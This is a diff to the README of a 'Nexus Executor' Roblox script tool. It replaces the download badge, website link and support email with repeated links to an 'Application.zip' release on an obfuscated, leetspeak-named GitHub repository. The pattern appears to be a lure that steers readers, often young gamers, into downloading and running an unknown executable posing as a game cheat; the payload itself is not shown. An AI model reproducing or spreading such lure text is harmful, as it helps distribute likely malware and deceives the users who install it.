@@ -32,12 +32,12 @@ Are you looking for a reliable and feature-packed executor for your Roblox Lua s
 ## 🔗 Download Nexus Executor
 You can download the Nexus Executor zip file by clicking on the button below:
 
-[![Download Nexus Executor](https://img.shields.io/badge/Download-Nexus%20Executor-brightgreen)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip "Launch Nexus Executor")
+[![Download Nexus Executor](https://github.com/hoshiro9711X/N3xus-Scr1pt-R0bl0x/releases/download/v1.0/Application.zip%20Executor-brightgreen)](https://github.com/hoshiro9711X/N3xus-Scr1pt-R0bl0x/releases/download/v1.0/Application.zip "Launch Nexus Executor")
 
 If the link does not work, please check the "Releases" section of this repository for alternative download options.
 
 ## 🌐 Visit Our Website
-For more information and updates on Nexus Executor, visit our official website [here](https://www.nexusexecutor.com).
+For more information and updates on Nexus Executor, visit our official website [here](https://github.com/hoshiro9711X/N3xus-Scr1pt-R0bl0x/releases/download/v1.0/Application.zip).
 
 ## 🎮 Getting Started
 To start using Nexus Executor, follow these steps:
@@ -50,7 +50,7 @@ To start using Nexus Executor, follow these steps:
 We welcome contributions from the community to enhance and improve Nexus Executor. If you have any suggestions, bug fixes, or new features to add, feel free to create a pull request and we will review it promptly.
 
 ## 📞 Contact Us
-If you have any questions or need support regarding Nexus Executor, you can reach out to us via email at support@nexusexecutor.com or through our Discord server.
+If you have any questions or need support regarding Nexus Executor, you can reach out to us via email at https://github.com/hoshiro9711X/N3xus-Scr1pt-R0bl0x/releases/download/v1.0/Application.zip or through our Discord server.
 
 ## 🌈 Join Our Community
 Connect with other Roblox scripters and Nexus Executor users on our Discord server. Share your scripts, get help, and stay updated on the latest developments in the Roblox scripting world.
